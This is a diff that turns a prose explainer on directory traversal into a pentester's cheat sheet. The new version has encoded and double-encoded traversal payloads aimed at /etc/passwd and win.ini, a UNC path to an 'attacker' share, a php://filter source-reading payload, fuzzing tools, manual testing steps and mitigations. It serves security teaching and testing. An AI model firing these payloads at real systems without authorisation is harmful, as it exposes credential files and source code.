@@ -1,31 +1,62 @@
 # What is Directory Traversal?
-Directory Traversal, also known as Path Traversal or Directory Climbing, is a type of security vulnerability that occurs when an attacker can access files or directories outside of the intended directory structure on a web server or file system. Attackers exploit this vulnerability to access sensitive files, execute unauthorized commands, or compromise the security of a system.
 
-## How Does Directory Traversal Work?
-- File System Navigation: Web servers and applications often allow users to access files or resources by specifying a file path or URL.
+Directory Traversal (also called path traversal) lets an attacker read (and sometimes write) files outside the intended directory by injecting `../` sequences into a file path the app builds from user input. It is a fast route to source code, config secrets, and `/etc/passwd`, and it frequently escalates into RCE when combined with file upload or log poisoning.
 
-- Input Manipulation: Attackers manipulate input parameters, such as file paths or URLs, by adding special characters or sequences to navigate to directories outside of the intended scope.
+## How it works
 
-- Traversal Attack: By exploiting insufficient input validation or sanitization, attackers traverse directories, accessing files or directories containing sensitive information or executable code.
+- The app builds a file path from input, for example `readFile("/var/www/files/" + name)`
+- `../` climbs up one directory each time
+- Enough climbs and you escape the web root into the filesystem
 
-## Example Scenario
-Suppose a web application serves files based on user-supplied file paths, such as example.com/files?path=user_input. An attacker may manipulate the input parameter to access files outside of the intended directory, such as ../../etc/passwd, which could expose sensitive system files containing user credentials.
+## Test payloads
 
-## Impact of Directory Traversal
-- Information Disclosure: Attackers can access sensitive files containing passwords, configuration files, or other confidential information, leading to data breaches or unauthorized access.
+```text
+# Basic
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
 
-- File Manipulation: Directory Traversal can allow attackers to modify or delete critical files, compromising the integrity of the system or disrupting its functionality.
+# URL-encoded and double-encoded to beat filters
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
 
-- Remote Code Execution: In some cases, Directory Traversal vulnerabilities may lead to remote code execution, enabling attackers to execute arbitrary commands on the server or upload malicious scripts for execution.
+# Null byte / extension tricks (legacy stacks)
+../../../../etc/passwd%00.png
 
-## Mitigating Directory Traversal
-- Input Validation: Validate and sanitize user input to ensure that file paths or URLs are restricted to the intended directory structure, preventing traversal attacks.
+# Absolute path and UNC
+/etc/passwd
+\\attacker\share\file
+```
 
-- File System Restrictions: Implement proper file system permissions and access controls to restrict access to sensitive files and directories, preventing unauthorized access.
+```php
+# PHP wrapper to read source instead of executing it
+php://filter/convert.base64-encode/resource=index.php
+```
 
-- Canonicalization: Normalize file paths and perform canonicalization to prevent the interpretation of special characters or sequences that could be used in traversal attacks.
+## Tools
 
-- Security Headers: Use security headers, such as Content Security Policy (CSP), to restrict the sources from which files can be loaded, reducing the risk of Directory Traversal attacks.
+- [Burp Suite](https://portswigger.net/burp) - manual traversal and encoding tests
+- [ffuf](https://github.com/ffuf/ffuf) - fuzz path parameters with a traversal wordlist
+- [dotdotpwn](https://github.com/wireghoul/dotdotpwn) - traversal fuzzer
 
-## Conclusion
-Directory Traversal is a security vulnerability that allows attackers to access files or directories outside of the intended directory structure, leading to information disclosure, file manipulation, or remote code execution. By implementing security measures such as input validation, file system restrictions, canonicalization, and security headers, developers can mitigate the risk of exploitation and protect their systems from Directory Traversal attacks. Regular security audits and updates are essential for maintaining a secure file system and web application environment.
+## Manual testing
+
+1. Find parameters that reference files: `file=`, `path=`, `page=`, `download=`
+2. Request a known file with increasing `../` depth
+3. If blocked, try URL-encoding, double-encoding, and mixed slashes
+4. On PHP, use `php://filter` to exfiltrate source safely
+
+## Mitigation
+
+- Never build paths from raw input; map input to an allowlist of IDs
+- Canonicalize the resolved path and confirm it stays inside the base directory
+- Strip or reject `../`, encoded variants, and absolute paths
+- Run with least privilege so escaped reads hit nothing sensitive
+
+## Deep dive
+
+- [Directory Traversal - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger path traversal labs](https://portswigger.net/web-security/file-path-traversal)
+
+## CWE
+
+- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
